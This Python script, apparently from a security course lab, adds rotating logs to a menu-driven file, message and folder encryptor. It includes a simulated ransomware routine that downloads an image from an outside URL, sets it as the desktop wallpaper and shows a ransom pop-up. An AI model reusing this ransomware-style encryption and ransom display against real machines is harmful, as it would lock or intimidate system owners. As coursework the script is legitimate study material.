#!/usr/bin/env python3
import os
import urllib.request
import ctypes
from cryptography.fernet import Fernet
from tkinter import messagebox
import logging
from logging.handlers import RotatingFileHandler

# Script Name:                  Event Logging Tool Part 2 of 3
# Author:                       NATASHA SIRAMARCO
# Date of latest revision:      08/15/2023
# Purpose:                      On the Python tool you added logging capabilities to:
#                               
#                               Add a log rotation feature based on size




# Set up Logging
file_log = 'app_log.log'
# Where log messages should be written, log level, and formatted
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

#log size in bytes
max_size_log = 10 * 1024 * 1024
log_files_count = 3

# Declaration of functions
# Developed with class review assistance
# Key generation
def generate_key():
    return Fernet.generate_key()
# Load Key and return as bytes
def load_key(key_file):
    with open(key_file, 'rb') as file:
        return file.read()
# Save the Key into a file
def save_key(key_file, key):
    with open(key_file, 'wb') as file:
        file.write(key)
# Encrypt file with fernet key
def encrypt_file(key, input_file, output_file):
    fernet = Fernet(key)
    # Read input content & encrypt
    with open(input_file, 'rb') as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    # Write encrypted data into output file
    with open(output_file, 'wb') as file:
        file.write(encrypted_data)
# Decryt data with fernet key
def decrypt_file(key, input_file, output_file):
    fernet = Fernet(key)
    # Read input conent and decrypt
    with open(input_file, 'rb') as file:
        data = file.read()
    decrypted_data = fernet.decrypt(data)
    # Writes decrypt data into output file
    with open(output_file, 'wb') as file:
        file.write(decrypted_data)
# Convert message into bytes, encrypt with fernet key
def encrypt_message(key, message):
    fernet = Fernet(key)
    encrypted_message = fernet.encrypt(message.encode())
    #print encrypted message as a string
    print("Encrypted message:", encrypted_message.decode())
# Fernet key and encrypted message 
def decrypt_message(key, encrypted_message):
    fernet = Fernet(key)
    decrypted_message = fernet.decrypt(encrypted_message.encode())
    #print decrypted message as a string
    print("Decrypted message:", decrypted_message.decode())


# Recursive folder and contents and key to encrypt
def encrypt_folder(key, input_folder, output_folder):
    for dirpath, dirnames, filenames in os.walk(input_folder):
        for filename in filenames:
            input_file = os.path.join(dirpath, filename)
            relative_path = os.path.relpath(input_file, input_folder)
            output_file = os.path.join(output_folder, relative_path)
            encrypt_file(key, input_file, output_file)
# Recursive folder and contents and key to decrypt
def decrypt_folder(key, input_folder, output_folder):
    for dirpath, dirnames, filenames in os.walk(input_folder):
        for filename in filenames:
            input_file = os.path.join(dirpath, filename)
            relative_path = os.path.relpath(input_file, input_folder)
            output_file = os.path.join(output_folder, relative_path)
            decrypt_file(key, input_file, output_file)




# Alter desktop wallpaper with ransomeware image
def desktop_wallpaper(image_ransome, message_ransome):
    imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
    # Download image and save it to the desktop folder
    path = '/home/ns/CodeFellows-Ops-401d-Labs-2/image-background.jpg' 
    urllib.request.urlretrieve(image_ransome, path)
    # Change the desktop wallpaper using Windows API
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
# popup window with ransomware message
    messagebox.showinfo("This is the ransomeware pop-up window, /n In order to decrypt follow the instruction... (pending) ", message_ransome)

# Set up Logging with RotatingFileHandler
log_rotating_handler = RotatingFileHandler(file_log, maxBytes=max_size_log, backupCount=log_files_count)
log_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
log_rotating_handler.setFormatter(log_format)

# Create and configure the logger
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
logger.addHandler(log_rotating_handler)


# Main
# Check if encryption key exists
def main():
    try:
        key_file = 'encryption_key.key'
        if not os.path.exists(key_file):
            key = generate_key()
            save_key(key_file, key)
        else:
            key = load_key(key_file)


# Menu
        print("Select a mode:")
        print("1 - Encrypt file")
        print("2 - Decrypt file")
        print("3 - Encrypt message")
        print("4 - Decrypt message")
        print("5 - Recursively encrypt folder and its contents")
        print("6 - Recursively decrypt folder that was encrypted by this tool")
        print("7 - Desktop wallpaper with ransomware message")


        mode = int(input("Enter mode: "))
        # Add log messages at different points: logging info, error and exception
        logging.info(f"Selected mode: {mode}")

        if mode == 1:
            encrypt_file(key, input("Enter filepath of file to encrypt: "), input("Enter filepath to save encrypted file: "))
            print("File encrypted successfully.")

        elif mode == 2:
            decrypt_file(key, input("Enter filepath of file to decrypt: "), input("Enter filepath to save decrypted file: "))
            print("File decrypted successfully.")

        elif mode == 3:
            encrypt_message(key, input("Enter message to encrypt: "))

        elif mode == 4:
            decrypt_message(key, input("Enter message to decrypt: "))

        elif mode == 5:
            input_folder = input("Enter folder path to encrypt: ")
            output_folder = input("Enter folder path to save encrypted files: ")
            encrypt_folder(key, input_folder, output_folder)
            print("Folder encrypted successfully.")

        elif mode == 6:
            input_folder = input("Enter folder path to decrypt: ")
            output_folder = input("Enter folder path to save decrypted files: ")
            decrypt_folder(key, input_folder, output_folder)
            print("Folder decrypted successfully.")

        elif mode == 7:
            desktop_wallpaper()
            print("Ransomware desktop wallpaper set and default pop-up message displayed successfully.")

        else:
            logging.error("Invalid mode Selection.")
            print("Invalid mode selection. Please try again..")
    # log details of exception
    except Exception as e:
        logging.exception("An error occured:")
        print(f"An error occured: {e}")

# Execute script main/menu selection
if __name__ == "__main__":
    main()



# End



# Resources
#           Python: How to Create Rotating Logs - https://www.blog.pythonlibrary.org/2014/02/11/python-how-to-create-rotating-logs/

